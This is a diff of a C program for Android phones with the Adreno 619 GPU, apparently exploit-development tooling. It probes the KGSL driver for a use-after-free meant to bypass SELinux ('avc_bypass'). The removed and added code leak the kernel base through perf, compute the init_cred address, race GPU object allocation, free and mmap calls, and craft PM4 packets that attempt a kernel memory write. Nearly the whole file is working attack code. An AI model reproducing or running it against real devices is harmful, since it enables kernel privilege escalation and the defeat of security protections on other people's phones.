@@ -1,9 +1,6 @@
 /*
- * kgsl_test_analyzer.c - KGSL/Adreno 619 low-level probe
- * Build: aarch64-linux-android-gcc -static -o kgsl_test_analyzer kgsl_test_analyzer.c -lpthread
- *
- * Tests all relevant ioctls and PM4 packets to determine working primitives
- * for a reliable avc_bypass on Snapdragon 695 (Adreno 619).
+ * kgsl_uaf_test.c - Test UAF reuse on Snapdragon 695 (Adreno 619)
+ * Build: aarch64-linux-android-gcc -static -o kgsl_uaf_test kgsl_uaf_test.c -lpthread
  */
 
 #include <stdio.h>
@@ -74,31 +71,15 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL
-#define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
+#define UAF_SIZE 0x10004000ULL
+#define OVERLAP_SIZE 0x1000
 #define BOGUS_SIZE 0x1000
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
 
-#define SPRAY_PIDS 2000
 #define VMLINUX_TEXT 0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED_OFFSET 0x26fa738
 
-/* ========================== PM4 opcodes ========================== */
-#define CP_NOP         0x10
-#define CP_MEM_WRITE   0x3D
-#define CP_REG_TO_MEM  0x3E
-#define CP_MEM_TO_REG  0x42
-#define CP_WAIT_REG_MEM 0x3C
-
-/* ========================== Global state ========================== */
 static int kgsl_fd = -1;
-static int verbose = 2;
-static uint64_t kaslr = 0;
-static uint64_t init_cred_addr = 0;
+static int verbose = 1;
 
 static void die(const char *msg) { perror(msg); exit(1); }
 static void debug(int lvl, const char *fmt, ...) {
@@ -107,24 +88,6 @@ static void debug(int lvl, const char *fmt, ...) {
     va_start(args, fmt);
     vprintf(fmt, args);
     va_end(args);
-}
-
-/* ========================== PM4 helpers ========================== */
-static uint32_t pm4_parity(uint32_t v) {
-    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
-}
-
-static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
-    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
-}
-
-static uint32_t cp_type3(uint32_t opcode, uint32_t cnt) {
-    return (3<<30) | ((cnt-1)<<16) | (opcode<<8);
-}
-
-static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
-    *lo = (uint32_t)addr;
-    *hi = (uint32_t)(addr >> 32);
 }
 
 /* ========================== KGSL wrappers ========================== */
@@ -143,13 +106,6 @@ static void gpuobj_free(unsigned int id) {
         debug(0, "  gpuobj_free(%u) failed: errno=%d\n", id, errno);
 }
 
-static void *gpuobj_mmap(size_t size, unsigned int id) {
-    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
-    if (p == MAP_FAILED)
-        debug(0, "  gpuobj_mmap(%zu,%u) failed: errno=%d\n", size, id, errno);
-    return p;
-}
-
 static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
     struct kgsl_gpuobj_info inf = { .id = id };
     int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
@@ -166,45 +122,6 @@ static unsigned int create_context(void) {
     struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
     if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
     return c.drawctxt_id;
-}
-
-static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
-    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
-    for (int i = 0; i < 100000; i++) {
-        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
-        if (r.timestamp >= target) return 0;
-        usleep(100);
-    }
-    return -2;
-}
-
-static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
-    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
-    struct kgsl_command_object cmd_obj = {
-        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
-        .flags = KGSL_CMDLIST_IB, .id = ib_id
-    };
-    struct kgsl_gpu_command gc = {0};
-    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
-    gc.cmdsize = sizeof(cmd_obj);
-    gc.numcmds = 1;
-    gc.context_id = ctx_id;
-    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
-    if (out_ts) *out_ts = gc.timestamp;
-    return ret;
-}
-
-/* ========================== Run a command sequence ========================== */
-static int run_cmd(uint32_t *cmd, int dwords,
-                   uint64_t ib_ga, void *ib_m,
-                   unsigned int ctx_id, unsigned int ib_id) {
-    memcpy(ib_m, cmd, dwords * 4);
-    __sync_synchronize();
-    unsigned int ts;
-    if (submit_ib(ctx_id, ib_ga, dwords * 4, ib_id, &ts) < 0) return -1;
-    if (wait_timestamp(ctx_id, ts) < 0) return -2;
-    __sync_synchronize();
-    return 0;
 }
 
 /* ========================== KASLR detection via perf ========================== */
@@ -257,341 +174,144 @@ static uint64_t detect_kaslr(void) {
     return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
 }
 
-/* ========================== dc civac test ========================== */
-static volatile int dc_civac_works = -1;
-static void sigill_handler(int sig) { dc_civac_works = 0; }
-
-static void try_dc_civac(void *addr) {
-    if (dc_civac_works == 0) return;
-    void *old = signal(SIGILL, sigill_handler);
-    __sync_synchronize();
-    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
-    asm volatile("dsb sy" : : : "memory");
-    __sync_synchronize();
-    signal(SIGILL, old);
-    if (dc_civac_works == -1) dc_civac_works = 1;
-}
-
-static void flush_dc_civac_range(void *start, size_t len) {
-    if (dc_civac_works != 1) return;
-    char *p = (char*)((uintptr_t)start & ~63);
-    char *end = (char*)((uintptr_t)start + len);
-    for (; p < end; p += 64) try_dc_civac(p);
-}
-
-/* ========================== Test: IMPORT parameters ========================== */
-static void test_import_params(void) {
-    printf("\n[*] Testing KGSL_GPUOBJ_IMPORT parameters\n");
-    uint64_t user_buf[2] = {0x123456789ABCDEF0ULL, 0xFEDCBA9876543210ULL};
-    uint64_t addrs[] = {
-        (uint64_t)(uintptr_t)user_buf,
-        (uint64_t)(uintptr_t)(((uintptr_t)user_buf + 0xFFF) & ~0xFFFULL),
-        (uint64_t)(uintptr_t)user_buf,
-        (uint64_t)(uintptr_t)user_buf
-    };
-    size_t sizes[] = {sizeof(user_buf), 0x1000, 0x1000, 0x1000};
-    uint64_t flags[] = {KGSL_MEMFLAGS_USE_CPU_MAP, KGSL_MEMFLAGS_USE_CPU_MAP, 0, 0};
-
-    for (int i = 0; i < 4; i++) {
-        struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = addrs[i] };
-        struct kgsl_gpuobj_import imp = {
-            .priv = (uint64_t)&uaddr,
-            .priv_len = sizes[i],
-            .flags = flags[i],
-            .type = KGSL_USER_MEM_TYPE_ADDR,
-        };
-        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-        printf("  test%d: addr=0x%lx size=%zu flags=0x%llx type=%d => ret=%d errno=%d",
-               i, (unsigned long)addrs[i], sizes[i], (unsigned long long)flags[i],
-               KGSL_USER_MEM_TYPE_ADDR, ret, ret<0?errno:0);
-        if (ret == 0) {
-            printf(" id=%u\n", imp.id);
-            gpuobj_free(imp.id);
-        } else {
-            printf("\n");
-        }
-    }
-}
-
-/* ========================== Test: PM4 packet operations ========================== */
-static void test_pm4_packets(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
-                             unsigned int ctx_id, unsigned int ib_id) {
-    printf("\n[*] Testing PM4 packets\n");
-
-    /* 1. CP_MEM_WRITE */
-    printf("  CP_MEM_WRITE: ");
-    uint64_t test_val = 0xCAFEBABEDEADBEEFULL;
-    uint32_t cmd[32];
-    int dw = 0;
-    uint32_t lo, hi;
-    split64(dst_ga, &lo, &hi);
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-    cmd[dw++] = lo; cmd[dw++] = hi;
-    split64(test_val, &lo, &hi);
-    cmd[dw++] = lo; cmd[dw++] = hi;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    memset(dst_m, 0, 16);
-    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
-        flush_dc_civac_range(dst_m, 16);
-        uint64_t got = *(uint64_t*)dst_m;
-        printf("got=0x%016lx %s\n", (unsigned long)got, got==test_val ? "[OK]" : "[FAIL]");
-    } else {
-        printf("failed\n");
-    }
-
-    /* 2. CP_REG_TO_MEM - test known registers */
-    printf("  CP_REG_TO_MEM: ");
-    uint32_t regs[] = {0x00000400, 0x00000404, 0x00000408, 0x0000040C, 0x00000410};
-    for (int i = 0; i < 5; i++) {
-        dw = 0;
-        split64(dst_ga, &lo, &hi);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
-        cmd[dw++] = regs[i];
-        cmd[dw++] = lo; cmd[dw++] = hi;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        memset(dst_m, 0, 16);
-        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
-            flush_dc_civac_range(dst_m, 16);
-            uint64_t val = *(uint64_t*)dst_m;
-            printf("reg=0x%04x => 0x%016lx ", regs[i], (unsigned long)val);
-        } else {
-            printf("reg=0x%04x => failed ", regs[i]);
-        }
-    }
-    printf("\n");
-
-    /* 3. CP_MEM_TO_REG */
-    printf("  CP_MEM_TO_REG: ");
-    uint32_t reg_wr = 0x00000408;
-    split64(dst_ga, &lo, &hi);
-    dw = 0;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    cmd[dw++] = cp_type7(CP_MEM_TO_REG, 4);
-    cmd[dw++] = reg_wr;
-    cmd[dw++] = lo; cmd[dw++] = hi;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
-        printf("wrote dst_ga to reg=0x%04x ", reg_wr);
-        // read back to verify
-        dw = 0;
-        split64(dst_ga + 8, &lo, &hi);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
-        cmd[dw++] = reg_wr;
-        cmd[dw++] = lo; cmd[dw++] = hi;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        memset(dst_m, 0, 16);
-        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
-            flush_dc_civac_range(dst_m, 16);
-            uint64_t val = *(uint64_t*)(dst_m + 8);
-            printf("readback=0x%016lx %s\n", (unsigned long)val, val != 0 ? "[READABLE]" : "[ZERO]");
-        } else {
-            printf("readback failed\n");
-        }
-    } else {
-        printf("failed\n");
-    }
-
-    /* 4. CP_WAIT_REG_MEM */
-    printf("  CP_WAIT_REG_MEM: ");
-    // first write a known value to dst_ga
-    dw = 0;
-    split64(dst_ga, &lo, &hi);
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-    cmd[dw++] = lo; cmd[dw++] = hi;
-    cmd[dw++] = 0x12345678; cmd[dw++] = 0;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
-        dw = 0;
-        split64(dst_ga, &lo, &hi);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        cmd[dw++] = cp_type7(CP_WAIT_REG_MEM, 6);
-        cmd[dw++] = 0x00000400;          // reg
-        cmd[dw++] = lo; cmd[dw++] = hi;  // mem addr
-        cmd[dw++] = 0x12345678;          // value
-        cmd[dw++] = 0x12345678;          // mask
-        cmd[dw++] = 0;                   // ?
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
-            printf("ok (waited for value)\n");
-        } else {
-            printf("failed (timeout?)\n");
-        }
-    } else {
-        printf("failed (could not write test value)\n");
-    }
-}
-
-/* ========================== Test: UAF race patterns ========================== */
-static volatile int race_done = 0;
-static void *race_thread_import(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
-    struct kgsl_gpuobj_import imp = {
-        .priv = (uint64_t)&uaddr,
-        .priv_len = BOGUS_SIZE,
-        .flags = 0,                      // no USE_CPU_MAP
-        .type = KGSL_USER_MEM_TYPE_ADDR,
-    };
-    while (!race_done) {
-        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-        usleep(50);
-    }
-    return NULL;
-}
-
-static void *race_thread_alloc(void *arg) {
-    while (!race_done) {
-        int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-        if (id >= 0) gpuobj_free(id);
-        usleep(50);
-    }
-    return NULL;
-}
-
-static void *race_thread_mmap(void *arg) {
-    int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-    while (!race_done) {
-        void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
-        if (p != MAP_FAILED) munmap(p, 0x1000);
-        usleep(50);
-    }
-    gpuobj_free(id);
-    return NULL;
-}
-
-static int run_race_pattern(int pattern, uint64_t alloc_flags) {
-    pthread_t thr;
-    race_done = 0;
-    int hit = 0;
-    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
-    if (ov_id < 0) return 0;
-    uint64_t ov_gpuaddr = 0;
-    gpuobj_info(ov_id, &ov_gpuaddr, NULL);
-    printf("  pattern %d: ov_id=%d ov_gpuaddr=0x%lx\n", pattern, ov_id, (unsigned long)ov_gpuaddr);
-
-    switch(pattern) {
-        case 0: pthread_create(&thr, NULL, race_thread_import, NULL); break;
-        case 1: pthread_create(&thr, NULL, race_thread_alloc, NULL); break;
-        case 2: pthread_create(&thr, NULL, race_thread_mmap, NULL); break;
-        default: pthread_create(&thr, NULL, race_thread_import, NULL); break;
-    }
-
-    for (int i = 0; i < 5000000 && !hit; i++) {
-        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
-            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-            kgsl_fd, (off_t)ov_id << 12);
-        int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
-        if (e == ENODEV) { hit = 1; break; }
-        if (i % 1000000 == 0 && i > 0) {
-            printf("    race %d/5000000 errno=%d\n", i, e);
-        }
-    }
-
-    race_done = 1;
-    pthread_join(thr, NULL);
-    gpuobj_free(ov_id);
-    return hit;
-}
-
-/* ========================== Main ========================== */
+/* ========================== Main test ========================== */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("=== KGSL/Adreno 619 Low-Level Analyzer ===\n");
+    printf("=== KGSL UAF Reuse Test on Adreno 619 ===\n");
 
-    struct utsname u;
-    uname(&u);
-    printf("System: %s %s %s\n", u.sysname, u.nodename, u.release);
-
-    /* Open KGSL device */
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    /* Detect KASLR */
-    kaslr = detect_kaslr();
+    /* Detect KASLR (for reference) */
+    uint64_t kaslr = detect_kaslr();
     if (!kaslr) {
         printf("[-] KASLR detection failed\n");
         close(kgsl_fd);
         return 1;
     }
-    printf("[+] KASLR = 0x%lx\n", (unsigned long)kaslr);
-    init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
-    printf("[*] init_cred = 0x%lx\n", (unsigned long)init_cred_addr);
+    printf("[+] KASLR = 0x%lx\n", kaslr);
+    printf("[*] init_cred = 0x%lx\n", kaslr + VMLINUX_INIT_CRED_OFFSET);
 
-    /* Test dc civac */
-    try_dc_civac((void*)&kgsl_fd);
-    printf("[*] dc civac: %s\n", dc_civac_works == 1 ? "works" : (dc_civac_works == 0 ? "not supported" : "unknown"));
+    /* Allocate a context (needed for some operations) */
+    unsigned int ctx = create_context();
+    printf("[*] Context created: %u\n", ctx);
 
-    /* Allocate basic objects */
-    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
-    if (ib_id < 0) die("ib alloc");
-    void *ib_m = gpuobj_mmap(0x10000, ib_id);
-    if (!ib_m) die("ib mmap");
-    uint64_t ib_ga = 0;
-    gpuobj_info(ib_id, &ib_ga, NULL);
-    printf("[*] IB: id=%d gpuaddr=0x%lx\n", ib_id, (unsigned long)ib_ga);
+    /* ========== Test 1: GPU address reuse for same size allocation ========== */
+    printf("\n[*] Test 1: Check if GPU address is reused after free+alloc\n");
+    uint64_t flags_with_cpu = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
+    uint64_t flags_without_cpu = KGSL_CACHEMODE_WRITEBACK; // no CPU map
 
-    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
-    if (dst_id < 0) die("dst alloc");
-    void *dst_m = gpuobj_mmap(0x4000, dst_id);
-    if (!dst_m) die("dst mmap");
-    uint64_t dst_ga = 0;
-    gpuobj_info(dst_id, &dst_ga, NULL);
-    printf("[*] DST: id=%d gpuaddr=0x%lx\n", dst_id, (unsigned long)dst_ga);
+    // Using size that is likely to be reused (large object)
+    uint64_t test_size = 0x100000; // 1MB
 
-    unsigned int ctx_id = create_context();
-    printf("[*] Context: %u\n", ctx_id);
+    // Allocate with CPU map
+    int id1 = gpuobj_alloc(test_size, flags_with_cpu);
+    if (id1 < 0) die("alloc1");
+    uint64_t gpuaddr1 = 0;
+    gpuobj_info(id1, &gpuaddr1, NULL);
+    printf("  alloc1 (with CPU map): id=%d, gpuaddr=0x%lx\n", id1, gpuaddr1);
+    gpuobj_free(id1);
 
-    /* 1. IMPORT tests */
-    test_import_params();
+    // Allocate again same size, same flags
+    int id2 = gpuobj_alloc(test_size, flags_with_cpu);
+    if (id2 < 0) die("alloc2");
+    uint64_t gpuaddr2 = 0;
+    gpuobj_info(id2, &gpuaddr2, NULL);
+    printf("  alloc2 (with CPU map): id=%d, gpuaddr=0x%lx\n", id2, gpuaddr2);
+    gpuobj_free(id2);
 
-    /* 2. PM4 packet tests */
-    test_pm4_packets(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
+    printf("  Reuse? %s\n", (gpuaddr1 == gpuaddr2) ? "[YES]" : "[NO]");
 
-    /* 3. UAF race tests */
-    printf("\n[*] Testing UAF race patterns\n");
-    for (int p = 0; p < 3; p++) {
-        printf("  pattern %d: ", p);
-        int won = run_race_pattern(p, alloc_flags);
-        printf("  %s\n", won ? "WON" : "LOST");
+    // Now test without CPU map
+    int id3 = gpuobj_alloc(test_size, flags_without_cpu);
+    if (id3 < 0) die("alloc3");
+    uint64_t gpuaddr3 = 0;
+    gpuobj_info(id3, &gpuaddr3, NULL);
+    printf("  alloc3 (without CPU map): id=%d, gpuaddr=0x%lx\n", id3, gpuaddr3);
+    gpuobj_free(id3);
+
+    int id4 = gpuobj_alloc(test_size, flags_without_cpu);
+    if (id4 < 0) die("alloc4");
+    uint64_t gpuaddr4 = 0;
+    gpuobj_info(id4, &gpuaddr4, NULL);
+    printf("  alloc4 (without CPU map): id=%d, gpuaddr=0x%lx\n", id4, gpuaddr4);
+    gpuobj_free(id4);
+
+    printf("  Reuse (no CPU map)? %s\n", (gpuaddr3 == gpuaddr4) ? "[YES]" : "[NO]");
+
+    /* ========== Test 2: GPU address for overlapped object with different flags ========== */
+    printf("\n[*] Test 2: GPU address for objects allocated with OVERLAP_SIZE\n");
+    // Try to allocate overlapped object with and without CPU map
+    uint64_t overlap_flags[] = {flags_with_cpu, flags_without_cpu};
+    const char *flag_names[] = {"with CPU map", "without CPU map"};
+    for (int i = 0; i < 2; i++) {
+        int ov_id = gpuobj_alloc(OVERLAP_SIZE, overlap_flags[i]);
+        if (ov_id < 0) {
+            printf("  alloc OVERLAP_SIZE (%s) failed\n", flag_names[i]);
+            continue;
+        }
+        uint64_t ov_gpuaddr = 0;
+        gpuobj_info(ov_id, &ov_gpuaddr, NULL);
+        printf("  ov_id=%d, gpuaddr=0x%lx (%s)\n", ov_id, ov_gpuaddr, flag_names[i]);
+        gpuobj_free(ov_id);
     }
 
-    /* 4. Try to write to init_cred directly (will likely fail, but test) */
-    printf("\n[*] Attempting direct write to init_cred (expect failure)\n");
-    uint64_t test_write_addr = init_cred_addr;
-    uint32_t cmd[16];
-    int dw = 0;
-    uint32_t lo, hi;
-    split64(test_write_addr, &lo, &hi);
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-    cmd[dw++] = lo; cmd[dw++] = hi;
-    cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
-        printf("  write succeeded (but likely ignored/faulted)\n");
+    /* ========== Test 3: UAF race attempt with proper overlapping ========== */
+    printf("\n[*] Test 3: Attempt UAF race by reusing same GPU address\n");
+    // We need to allocate a large object, get its GPU address, free it,
+    // then allocate a smaller object that fits inside the same region,
+    // and check if the smaller object's GPU address is within the freed region.
+    // This is the classic UAF pattern used in avc_bypass.
+
+    // Allocate large object
+    int large_id = gpuobj_alloc(UAF_SIZE, flags_with_cpu);
+    if (large_id < 0) die("large alloc");
+    uint64_t large_gpuaddr = 0;
+    gpuobj_info(large_id, &large_gpuaddr, NULL);
+    printf("  Large object id=%d, gpuaddr=0x%lx\n", large_id, large_gpuaddr);
+
+    // Free it
+    gpuobj_free(large_id);
+    printf("  Freed large object\n");
+
+    // Now allocate a smaller object that will likely reuse the same GPU address
+    int small_id = gpuobj_alloc(OVERLAP_SIZE, flags_with_cpu);
+    if (small_id < 0) die("small alloc");
+    uint64_t small_gpuaddr = 0;
+    gpuobj_info(small_id, &small_gpuaddr, NULL);
+    printf("  Small object id=%d, gpuaddr=0x%lx\n", small_id, small_gpuaddr);
+
+    // Check if small_gpuaddr falls within the large object's range
+    if (small_gpuaddr >= large_gpuaddr && small_gpuaddr < large_gpuaddr + UAF_SIZE) {
+        printf("  [SUCCESS] Small object allocated inside freed large object region! UAF possible.\n");
     } else {
-        printf("  write failed (expected)\n");
+        printf("  [FAIL] Small object not inside freed region. UAF may not work.\n");
     }
+    gpuobj_free(small_id);
 
-    /* 5. Check if /sys/fs/selinux/enforce is writable */
-    printf("\n[*] SELinux enforce status: ");
-    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
-    if (fd >= 0) {
-        char c;
-        if (read(fd, &c, 1) == 1) printf("%c\n", c);
-        else printf("unknown\n");
-        close(fd);
+    /* ========== Test 4: Check if mmap on freed object still works ========== */
+    printf("\n[*] Test 4: mmap on freed object (should fail or map stale)\n");
+    // Allocate, mmap, free, then mmap again (should fail or map something else)
+    int test_id = gpuobj_alloc(0x1000, flags_with_cpu);
+    if (test_id < 0) die("test alloc");
+    void *map1 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)test_id << 12);
+    if (map1 == MAP_FAILED) {
+        printf("  mmap before free: failed\n");
     } else {
-        printf("unreadable\n");
+        printf("  mmap before free: success at %p\n", map1);
+        munmap(map1, 0x1000);
+    }
+    gpuobj_free(test_id);
+    void *map2 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)test_id << 12);
+    if (map2 == MAP_FAILED) {
+        printf("  mmap after free: failed (errno=%d)\n", errno);
+    } else {
+        printf("  mmap after free: success at %p (unexpected!)\n", map2);
+        munmap(map2, 0x1000);
     }
 
-    printf("\n[*] Analyzer finished.\n");
     close(kgsl_fd);
+    printf("\n[*] Test complete.\n");
     return 0;
 }
